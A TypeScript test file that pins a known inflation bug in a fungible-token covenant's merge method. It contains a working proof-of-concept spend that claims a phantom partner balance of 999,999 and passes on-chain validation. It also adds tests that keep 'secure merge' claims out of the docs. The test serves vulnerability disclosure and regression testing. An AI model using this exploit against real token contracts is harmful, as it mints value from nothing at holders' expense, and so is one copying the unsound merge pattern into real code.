/**
 * W8 / SoloMerge — `token-ft`'s `merge` mints tokens from nothing, and this
 * test pins that as KNOWN-BROKEN so nobody "fixes" it by mocking a second
 * input again.
 *
 * `merge(sig, otherBalance, allPrevouts, outputSatoshis)` writes `otherBalance`
 * — a number the SPENDER chooses — into the successor's second balance slot,
 * on the theory that a second token input running the same covenant is
 * simultaneously forcing the two claims to agree through `hashOutputs`. Nothing
 * in the script ever checks that a second token input exists:
 *
 *   - `hash256(allPrevouts) === extractHashPrevouts(preimage)` proves
 *     `allPrevouts` is the real prevout list. It says nothing about how many
 *     entries it has or what covenant any of them runs.
 *   - `myOutpoint === substr(allPrevouts, 0, 36)` is a POSITION test. With one
 *     input it is trivially true, so the spend takes the "I am input 0" arm and
 *     `otherBalance` is minted out of thin air.
 *   - `len(allPrevouts) === 72` would not fix it either: a plain P2PKH fee
 *     input fills the second slot without executing the token covenant at all.
 *
 * The docstring that claimed this was a "Secure merge" with an "anti-inflation
 * proof" described a two-covenant argument whose premise is never established.
 * Those claims are removed from all nine surface sources; this test is the
 * executable half of the same correction.
 *
 * ORACLE. `@bsv/sdk` `Spend.validate()`, via the real-crypto oracle's
 * `validateContractInput` (same engine, including NEW-005 script detaching).
 * The existing `FungibleToken.test.ts` merge test hands `TestContract` 72
 * mocked zero bytes and a matching mocked hash and merges on a SINGLE contract
 * instance — which is precisely how this survived to v1. Never assert this
 * family on `TestContract`.
 *
 * WHEN THE PROTOCOL IS FIXED: these expectations invert. `soloMergeAccepted`
 * becomes false and the inflation assertion becomes an assertion that supply is
 * conserved. Do not delete the test; flip it, and say so in the commit.
 */

import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { Transaction } from '@bsv/sdk';
import {
  RunarContract,
  MockProvider,
  LocalSigner,
  extractStateFromScript,
  buildP2PKHScript,
} from 'runar-sdk';
import { compile } from 'runar-compiler';
import { testKey, validateContractInput } from '../oracle/index.js';

const REPO_ROOT = join(__dirname, '..', '..', '..', '..');
const TOKEN_FT_TS = join(
  REPO_ROOT,
  'examples/ts/token-ft/FungibleTokenExample.runar.ts',
);

/** Balance the honest UTXO actually holds. */
const REAL_BALANCE = 10n;
/** Balance the attacker claims the (non-existent) other input holds. */
const PHANTOM_BALANCE = 999_999n;

interface SoloMergeResult {
  accepted: boolean;
  error?: string;
  successorBalance?: bigint;
  successorMergeBalance?: bigint;
  /** Total inputs on the built call transaction (contract + any SDK funding). */
  inputCount?: number;
  /** How many of those inputs spend the deployed token UTXO. */
  tokenInputCount?: number;
}

/**
 * Deploy one token UTXO holding `REAL_BALANCE`, then spend it ALONE through
 * `merge`, claiming a phantom partner worth `PHANTOM_BALANCE`.
 *
 * `allPrevouts` is not guessed: it is read back off the built transaction, so
 * the `hash256(allPrevouts) === hashPrevouts` guard is genuinely satisfied
 * rather than side-stepped.
 */
async function runSoloMerge(
  /**
   * What the successor UTXO is told to carry in `mergeBalance`. Equal to the
   * `otherBalance` argument on the exploit path. Made a knob purely so the
   * negative control can set it to a DIFFERENT value and prove the covenant's
   * own hashOutputs binding is live — without that control, a pass here could
   * just mean the harness never reached a real check.
   */
  successorMergeBalance: bigint = PHANTOM_BALANCE,
): Promise<SoloMergeResult> {
  const source = readFileSync(TOKEN_FT_TS, 'utf8');
  const compiled = compile(source, { fileName: 'FungibleTokenExample.runar.ts' });
  if (!compiled.artifact) {
    throw new Error(
      'compile failed: ' +
        compiled.diagnostics.filter(d => d.severity === 'error').map(d => d.message).join('; '),
    );
  }

  const alice = testKey('alice');
  const signer = new LocalSigner(alice.privKey);
  const provider = new MockProvider();
  const address = await signer.getAddress();
  provider.addUtxo(address, {
    txid: alice.privKey.slice(0, 64),
    outputIndex: 0,
    satoshis: 500_000,
    script: buildP2PKHScript(alice.pubKey),
  });

  // The SDK's OFF-CHAIN ANF interpreter cannot evaluate `merge`: it has no arm
  // for `extractHashPrevouts`, so `prepareCall` fails closed (NEW-006) before
  // it builds anything, and there is no `newState` override that gets past it.
  // Dropping `anf` from a COPY of the artifact turns off exactly that
  // off-chain state derivation and nothing else — the locking script, the
  // constructor slots, the BIP-143 preimage and the on-chain `checkPreimage`
  // continuation check are all untouched — and we then hand it the successor
  // explicitly. If the successor were wrong, the covenant's own hashOutputs
  // binding would reject the spend, so this cannot manufacture a pass.
  //
  // Worth recording on its own: no SDK caller can build ANY `merge` call today,
  // including an honest two-input one. `integration/ts/fungible-token.test.ts`
  // is written against this path.
  const artifactNoAnf = { ...compiled.artifact, anf: undefined };

  const contract = new RunarContract(artifactNoAnf, [
    alice.pubKey,
    REAL_BALANCE,
    0n,
    '01',
  ]);
  await contract.deploy(provider, signer, {});
  const deployTx = Transaction.fromHex(provider.getBroadcastedTxs()[0]!);
  // Snapshot BEFORE call — `call` overwrites `currentUtxo` with the successor.
  // Do not compare `sourceTXID` to `deployTx.id('hex')`: @bsv/sdk's parsed
  // input txid and `id('hex')` are not the same encoding, which is what made
  // an earlier helper look like the exploit had vanished.
  const spent = contract.getUtxo();
  if (!spent) {
    throw new Error('deploy did not leave a tracked UTXO');
  }

  try {
    await contract.call(
      'merge',
      // `allPrevouts: null` asks the SDK to fill the real prevout list in from
      // the transaction it is building — the same call shape the two-input
      // integration test uses, so the `hash256(allPrevouts) === hashPrevouts`
      // guard is genuinely satisfied rather than side-stepped. The only
      // difference here is that there is no second token input.
      [null, PHANTOM_BALANCE, null, 1n],
      provider,
      signer,
      {
        dryRun: true,
        // The successor the attacker wants: their real 10, plus a phantom
        // partner's 999_999. Stated explicitly because the SDK's off-chain ANF
        // interpreter does not model `extractHashPrevouts` and so cannot derive
        // it. This is a statement about the OFF-CHAIN builder only — the
        // on-chain script recomputes the continuation itself and the
        // `checkPreimage` binding still has to hold, so a wrong value here
        // makes `Spend` REJECT rather than wave the spend through.
        outputs: [
          {
            satoshis: 1,
            state: {
              owner: alice.pubKey,
              balance: REAL_BALANCE,
              mergeBalance: successorMergeBalance,
            },
          },
        ],
      },
    );
  } catch (e) {
    return { accepted: false, error: e instanceof Error ? e.message : String(e) };
  }

  const callTx = Transaction.fromHex(provider.getBroadcastedTxs()[1]!);
  // The SDK puts the contract UTXO at input 0. Extra inputs are P2PKH fee
  // inputs and do not run this covenant.
  const accepted = validateContractInput(callTx, 0, deployTx, spent.outputIndex);
  const state = extractStateFromScript(
    compiled.artifact,
    callTx.outputs[0]!.lockingScript.toHex(),
  ) as Record<string, unknown>;

  const tokenInputCount =
    callTx.inputs[0]?.sourceOutputIndex === spent.outputIndex ? 1 : 0;

  return {
    accepted,
    successorBalance: state['balance'] as bigint,
    successorMergeBalance: state['mergeBalance'] as bigint,
    inputCount: callTx.inputs.length,
    tokenInputCount,
  };
}

describe('W8 / SoloMerge: token-ft merge mints tokens from nothing (KNOWN-BROKEN)', () => {
  it('a ONE-token-input transaction passes merge and inflates supply', async () => {
    const res = await runSoloMerge();

    // Exactly one TOKEN input. The SDK may append a P2PKH fee input after it;
    // that does not close the hole (a fee input is not a second token covenant).
    expect(res.tokenInputCount, res.error).toBe(1);
    expect(res.inputCount, res.error).toBeGreaterThanOrEqual(1);

    // KNOWN-BROKEN. When the protocol half lands this becomes `false` and the
    // balance assertions below become a supply-conservation check.
    expect(res.accepted, res.error).toBe(true);

    // 10 in, 1_000_009 out. `send`/`transfer` spend `balance + mergeBalance`.
    expect(res.successorBalance).toBe(REAL_BALANCE);
    expect(res.successorMergeBalance).toBe(PHANTOM_BALANCE);
    expect(
      (res.successorBalance ?? 0n) + (res.successorMergeBalance ?? 0n),
    ).toBeGreaterThan(REAL_BALANCE);
  });

  it('NEGATIVE CONTROL: the covenant still rejects a successor it did not compute', async () => {
    // Same single-input spend, same `otherBalance` argument, but the successor
    // UTXO is built with a mergeBalance one off from what the script computes.
    // The on-chain hashOutputs binding must catch it. If this ever passes, the
    // test above is proving nothing — the harness would be accepting any
    // transaction at all, rather than reporting a real Spend verdict.
    const res = await runSoloMerge(PHANTOM_BALANCE + 1n);

    expect(res.accepted).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Documentation: the security claim must not come back
// ---------------------------------------------------------------------------

/** Every surface `conformance/tests/token-ft/source.json` points at. */
const TOKEN_FT_SOURCES = [
  'examples/ts/token-ft/FungibleTokenExample.runar.ts',
  'examples/sol/token-ft/FungibleTokenExample.runar.sol',
  'examples/move/token-ft/FungibleTokenExample.runar.move',
  'examples/go/token-ft/FungibleTokenExample.runar.go',
  'examples/rust/token-ft/FungibleTokenExample.runar.rs',
  'examples/python/token-ft/FungibleTokenExample.runar.py',
  'examples/zig/token-ft/FungibleTokenExample.runar.zig',
  'examples/ruby/token-ft/FungibleTokenExample.runar.rb',
  'examples/java/src/main/java/runar/examples/token-ft/FungibleTokenExample.runar.java',
];

/** Extra in-repo sentences that repeated the same false claim. */
const EXTRA_CLAIM_FILES = [
  'integration/ts/fungible-token.test.ts',
  'integration/go/token_ft_test.go',
  'integration/rust/tests/fungible_token.rs',
  'docs/formats/solidity.md',
];

/**
 * Phrases that assert the merge is safe. Each was present before W8. Matching
 * is case-insensitive so a re-capitalisation cannot smuggle one back.
 */
const FORBIDDEN_CLAIMS: Array<{ pattern: RegExp; why: string }> = [
  { pattern: /secure merge/i, why: 'calls the merge secure' },
  { pattern: /anti-inflation/i, why: 'claims an anti-inflation property' },
  { pattern: /why this is secure/i, why: 'presents a security proof' },
  { pattern: /prevents the inflation attack/i, why: 'claims inflation is prevented' },
  { pattern: /preventing inflation/i, why: 'claims inflation is prevented' },
];

describe('W8 / SoloMerge: no token-ft source claims the merge is secure', () => {
  for (const rel of TOKEN_FT_SOURCES) {
    it(`${rel} carries no security claim for merge`, () => {
      const text = readFileSync(join(REPO_ROOT, rel), 'utf8');
      const hits = FORBIDDEN_CLAIMS.filter(c => c.pattern.test(text)).map(c => c.why);
      expect(hits, `${rel}: ${hits.join('; ')}`).toEqual([]);
    });

    it(`${rel} warns that merge is unsound`, () => {
      const text = readFileSync(join(REPO_ROOT, rel), 'utf8');
      expect(text).toContain('UNSOUND');
    });
  }

  for (const rel of EXTRA_CLAIM_FILES) {
    it(`${rel} carries no security claim for merge`, () => {
      const text = readFileSync(join(REPO_ROOT, rel), 'utf8');
      const hits = FORBIDDEN_CLAIMS.filter(c => c.pattern.test(text)).map(c => c.why);
      expect(hits, `${rel}: ${hits.join('; ')}`).toEqual([]);
    });
  }
});
